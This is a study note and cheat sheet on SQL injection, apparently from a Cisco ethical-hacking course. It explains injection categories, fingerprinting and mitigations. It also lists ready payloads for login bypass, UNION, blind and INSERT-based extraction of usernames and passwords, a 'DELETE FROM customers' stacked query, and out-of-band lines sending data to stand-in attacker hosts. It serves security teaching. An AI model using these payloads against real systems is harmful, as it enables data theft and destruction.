---
tags:
  - CyberSec
  - Vulns/Web
  - CiscoEH
  - NBBC
---
**_[[SQL]] injection (SQLi)_** vulnerabilities can be catastrophic because they can allow an attacker to view, insert, delete, or modify records in a database. In injection attack, the attacker inserts, or _injects_, partial or complete SQL queries via the web application. The attacker injects SQL commands into input fields in an application or a URL in order to execute predefined SQL commands.
>An SQL Injection vulnerability allows an attacker to potentially execute malicious queries. 

One of the first steps when you find SQL injection vulnerabilities is to understand when the application interacts with a database. This is typically done with web authentication forms, search engines, and interactive sites such as e-commerce sites.
You can make a list of all input fields whose values could be used in crafting a valid SQL query. This includes trying to identify and manipulate hidden fields of **POST** requests and then testing them separately, trying to interfere with the query and to generate an error. As part of penetration testing, you should pay attention to HTTP headers and cookies.
As a penetration tester, you can start by adding a single quote (‘) or a semicolon ( **;** ) to the field or parameter in a web form. The single quote is used in SQL as a string terminator. If the application does not filter it correctly, you may be able to retrieve records or additional information that can help enhance your query or statement.
You can also use comment delimiters (such as **--** or **/* */** ), as well as other SQL keywords, including **AND** and **OR** operands. Another simple test is to insert a string where a number is expected.

Basic SQLi prompt: `xyz' or '1'='1`
## SQL Injection Categories
SQL injection attacks can be divided into the following categories:
- **In-band SQL injection:** With this type of injection, the attacker obtains the data by using the same channel that is used to inject the SQL code. This is the most basic form of an SQL injection attack, where the data is dumped directly in a web application (or web page).
	- eg: Error based, Union based
- **Out-of-band SQL injection:** With this type of injection, the attacker retrieves data using a different channel. For example, an email, a text, or an instant message could be sent to the attacker with the results of the query; or the attacker might be able to send the compromised data to another system.
- **Blind (or inferential) SQL injection:** With this type of injection, the attacker does not make the application display or transfer any data; rather, the attacker is able to reconstruct the information by sending specific statements and discerning the behavior of the application and database.
	- eg: Time based, Boolean SQLi

## Techniques
There are essentially five techniques that can be used to exploit SQL injection vulnerabilities:
- **Union operator:** This technique is typically used when an SQL injection vulnerability allows a UNION statement to combine two SELECT statements into a single injected query.
- **Boolean:** This is used to verify whether certain conditions are true or false.
- **Error-based technique:** This is used to force the database to generate an error in order to enhance and refine an attack (injection).
- **Out-of-band technique:** This is typically used to obtain records from the database by using a different channel. For example, it is possible to make an HTTP connection to send the results to a different web server or a local machine running a web service.
- **Time delay:** It is possible to use database commands to delay answers. An attacker may use this technique when he or she doesn’t get output or error messages from the application. An attacker can use this method to verify that injected queries are valid.

### Database Fingerprinting
In order to successfully execute complex queries and exploit different combinations of SQL injections, you must first fingerprint the database. The SQL language is defined in the ISO/IEC 9075 standard. However, databases differ from one another in terms of their ability to perform additional commands, their use of functions to retrieve data, and other features. When performing more advanced SQL injection attacks, an attacker needs to know what back-end database the application uses (for example, Oracle, MariaDB, MySQL, PostgreSQL).

One of the easiest ways to fingerprint a database is to pay close attention to any errors returned by the application, as demonstrated in the following syntax error message from a MySQL database:
```
  MySQL Error 1064: You have an error in your SQL syntax
```
The following is an error from a Microsoft SQL database:
```
Microsoft SQL Native Client error %u201880040e14%u2019
Unclosed quotation mark after the character string
```
The following is an error message from a Microsoft SQL Server database with Active Server Page (ASP):
```
Server Error in '/' Application
```
The following is an error message from an Oracle database:
```
ORA-00933: SQL command not properly ended
```
The following is an error message from a PostgreSQL database:
```
PSQLException: ERROR: unterminated quoted string at or near " ' " Position: 1 
or
Query failed: ERROR: syntax error at or near
" ' " at character 52 in /www/html/buyme.php on line 69.
```
If you are trying to fingerprint a database, and there is no error message from the database, you can try using concatenation, as shown here:
```
MySQL: 'finger' + 'printing'
SQL Server: 'finger' 'printing'
Oracle: 'finger'||'printing'
PostgreSQL: 'finger'||'printing'
```
Use the built in DATABASE() function in MySQL to return the current database data.  
### The UNION Exploitation Technique
The SQL **UNION** operator is used to combine the result sets of two or more **SELECT** statements, as shown here:
```
SELECT zipcode FROM h4cker_customers
UNION
SELECT zipcode FROM h4cker_suppliers;
```
By default, the **UNION** operator selects only distinct values. You can use the **UNION ALL** operator if you want to allow duplicate values.
Attackers may use the **UNION** operator in SQL injections attacks to join queries. The main goal of this strategy is to obtain the values of columns of other tables. The following is an example of a **UNION** -based SQL injection attack:
```
SELECT zipcode FROM h4cker_customers WHERE zip=1 UNION ALL
SELECT creditcard FROM payments
```
We can use the UNION command to work out how many rows should be returned. by union select 1,2,3,4,5,..... . siince union only work with same no of columns this will give idea of the table.
`select * from articles where released=1 and id='0' union select 1,2,3,4;--'`
this will show 1,2,3,4 in the respective columns
### Booleans in SQL Injection Attacks
The Boolean technique is typically used in blind SQL injection attacks. In blind SQL injection vulnerabilities, the vulnerable application typically does not return an SQL error, but it could return an HTTP 500 message, a 404 message, or a redirect. It is possible to use Boolean queries against an application to try to understand the reason for such error codes.
eg: `1' AND 1-1#`
### Out-of-Band Exploitation
The out-of-band exploitation technique is very useful when you are exploiting a blind SQL injection vulnerability. You can use database management system (DBMS) functions to execute an out-of-band connection to obtain the results of the blind SQL injection attack. An attacker could exploit a blind SQL injection vulnerability at store.example.org and then force the victim server to send the results of the query (compromised data) to another server (malicious.hacker.org).
Say that the malicious SQL string is as follows:
`https://store.h4cker.org/buyme.php?id=8||UTL_HTTP.request('malicious.h4cker.org')||(SELECT user FROM DUAL)--`
In this example, the attacker is using the value 8 combined with the result of Oracle’s function **UTL_HTTP.request**.
### Stacked Queries
In a normal SQL query, you can use a semicolon to specify that the end of a statement has been reached and what follows is a new one. This technique allows you to execute multiple statements in the same call to the database. **UNION** queries used in SQL injection attacks are limited to **SELECT** statements. However, **_stacked queries_** can be used to execute any SQL statement or procedure. A typical attack using this technique could specify a malicious input statement such as the following:
`1; DELETE FROM customers`
### The Time-Delay SQL Injection Technique
When trying to exploit a blind SQL injection, the Boolean technique is very helpful. Another trick is to also induce a delay in the response, which indicates that the result of the conditional query is true.
The following is an example of using the time-delay technique against a MySQL server:
`https://store.h4cker.org/buyme.php?id=8 AND IF(version() like '8%', sleep(10), 'false'))--`
In this example, the query checks whether the MySQL version is 8.x and then forces the server to delay the answer by 10 seconds. The attacker can increase the delay time and monitor the responses. The attacker could even set the sleep parameter to a high value since it is not necessary to wait that long and then just cancel the request after a few seconds.
### Surveying a Stored Procedure SQL Injection
A _stored procedure_ is one or more SQL statements or a reference to an SQL server. Stored procedures can accept input parameters and return multiple values in the form of output parameters to the calling program. They can also contain programming statements that execute operations in the database (including calling other procedures).
If an SQL server does not sanitize user input, it is possible to enter malicious SQL statements that will be executed within the stored procedure. The following example illustrates the concept of a stored procedure:
```
  Create procedure user_login @username varchar(20), @passwd varchar(20) As Declare @sqlstring varchar(250)
Set @sqlstring = ' Select 1 from users Where username = ' + @username + ' and passwd = ' + @passwd exec(@sqlstring) Go
```
By entering **omar or 1=1' somepassword** in a vulnerable application where the input is not sanitized, an attacker could obtain the password as well as other sensitive information from the database.
## SQL Injection Mitigations
Input validation is an important part of mitigating SQL injection attacks. The best mitigation for SQL injection vulnerabilities is to use immutable queries, such as the following:
- Static queries
- Parameterized queries
- Stored procedures (if they do not generate dynamic SQL)
Immutable queries do not contain data that could get interpreted. In some cases, they process the data as a single entity that is bound to a column without interpretation.
The following are two examples of static queries:
```
select * from contacts;
select * from users where user = "omar";
```
The following are examples of parameterized queries:
```
String query = "SELECT * FROM users WHERE name = ?";
PreparedStatement statement =
connection.prepareStatement(query);
statement.setString(1, username);
ResultSet results = statement.executeQuery();
```

**TIP** OWASP has a great resource that explains the SQL mitigations in detail; see [_https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet_](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet).
The OWASP Enterprise Security API (ESAPI) is another great resource. It is an open-source web application security control library that allows organizations to create lower-risk applications. ESAPI provides guidance and controls that mitigate SQL injection, XSS, CSRF, and other web application security vulnerabilities that take advantage of input validation flaws. You can obtain more information about ESAPI from [_https://owasp.org/www-project-enterprise-security-api/_](https://owasp.org/www-project-enterprise-security-api/).
## Tools
- [[SQLmap]] 
	- to automate an SQL injection attack. SQLmap comes installed by default in Kali Linux and Parrot OS.
	- [_https://sqlmap.org_](https://sqlmap.org/)
## Payloads
### Authentication Bypass
```
' OR 1=1 --
' OR '1'='1' --
admin' -- 
admin' # 
admin'/* 
' OR 1=1 LIMIT 1 -- 
```

### Union Based SQLi
```
' UNION SELECT NULL, NULL --
' UNION SELECT 1, 'admin' --
' UNION SELECT user, password FROM users --
```
### Payloads to Extract Info
```
# Database version:
' UNION SELECT 1, version() --
' UNION SELECT 1, @@version --  
# Current Database:
' UNION SELECT 1, database() -- 
# All tables in current DB:
' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()-- 
# All columns in a table:
' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'-- 
```
### Error Based SQLis
```
' AND 1=CONVERT(int, (SELECT @@version))-- 
' AND 1=CAST((SELECT table_name FROM information_schema.tables) AS int)-- 
```
### Boolean based blind SQLi
```
' AND 1=1 -- ✅ (true)
' AND 1=2 -- ❌ (false)
' AND (SELECT COUNT(*) FROM users) > 0 -- 
# boolean based info extraction  // enumerate through the letters in LIKE operation. 
' AND 1=(select 1 from information_schema.SCHEMATA where SCHEMA_NAME LIKE 'a%');--'  
' and 1=(select 1 from information_schema.TABLES where TABLE_NAME like 'users%' AND TABLE_SCHEMA='sqli');--
' and 1=(select 1 from information_schema.COLUMNS where COLUMN_NAME like 'username%' AND TABLE_NAME='users');--
' and 1=(select 1 from users where username like 'admin%');-- // use = operation to confirm 
```
### Time Based
If it is a valid SQL statement, the response will be delayed. 
```
' OR IF(1=1, SLEEP(5), 0)-- 
' OR SLEEP(5)-- 
' AND IF(substring(@@version,1,1)='5', SLEEP(5), 0)-- 
' or 1=SLEEP(3);--
' or ( select SLEEP(3) FROM information_schema.SCHEMATA WHERE SCHEMA_NAME LIKE 'a%' LIMIT 1);--
' or ( select SLEEP(3) FROM users WHERE username LIKE 'a%' LIMIT 1);--
```
### Out-of-Band SQLi (OOB)
```
'; EXEC xp_dirtree '\\attacker.com\abc'--  -- (MSSQL)
'; SELECT LOAD_FILE('\\\\attacker.com\\file')--  -- (MySQL)
```
## Insert Error based
Assume a blog website with a commenting feature title and comment fields,  where if we enter 'title' and 'comment' and the SQL query ran is:
`insert into comments (date,title,comment) values ('1752669636','title','comment')`

We can using Injection, place the word title in the title field and comment in the comment field with only entering text into the title form field : `title','comment2');--`
The SQL query run will be : `insert into comments (date,title,comment) values ('1752669636','title','comment');--','unusedcomment')`

In this way we can extract info into the comment field by running sub queries in the comment field.
- Using the version() command, create a sub query to place the MySQL version into the comment: 
	`title',(version()));--`
- This time use the subquery to extract distinct database names from the information_schema.tables table. : 
	`title',(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.tables));--`
- Now we know the database of interest we can get a list of all the tables by changing the returned row to TABLE_NAME and putting a where filter on TABLE_SCHEMA.
	`title',(SELECT GROUP_CONCAT(DISTINCT TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA = 'sqli_five'));--`
- We have our database name and users table of interest, query the information_schema.columns table to extract a list of all the columns on the users table.
	`title',(SELECT GROUP_CONCAT(DISTINCT COLUMN_NAME) FROM information_schema.columns WHERE TABLE_NAME = 'users'));--`
- Having the database,table and column information let's extract all the user information.
	`title',( SELECT GROUP_CONCAT(username,':',password) FROM users) );--`

### Insert Blind Based
Assume a page with fields name,email,message and runs a SQL query of `insert into comments (date,name,email,message) values ('1752671732','name','mail','message')`
Using the injection point, get the process to pause for 5 seconds to prove we have SQL Injection
	`',( SELECT SLEEP(5) ),'');--`
	 The query run will be `insert into comments (date,name,email,message) values ('1752671732','',( SELECT SLEEP(5) ),'');--','','')`
	 And if the process is held 5 sec, it implies this is vulnerable to SQLi.
Using the version() command, create a sub query to check whether the version starts with a particular number:
	`',( select sleep(5) where version() like '8%' ) ,'');--`
Likewise we can enumerate for information from the database.
	`',( select SLEEP(1) FROM users WHERE username LIKE 'a%') ,'');--`


## Injection Prevention
SQL queries are often programmed with the assumption that users will only input relevant information. For example, a login form that expects users to input their email address assumes the input will be formatted a certain way, such as _jdoe@domain.com_. Unfortunately, this isn’t always the case.

A key to preventing SQL injection attacks is to _escape_ _user inputs_—preventing someone from inserting any code that a program isn't expecting.
There are several ways to escape user inputs:
- **Prepared statements**: a coding technique that executes SQL statements before passing them on to a database
- **Input sanitization**: programming that removes user input which could be interpreted as code.
- **Input validation**: programming that ensures user input meets a system's expectations.
Resource:
[OWASP's SQL injection detection techniques](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection) 

---
https://bl0ss0mx5.netlify.app/research/sqli/cheatsheet/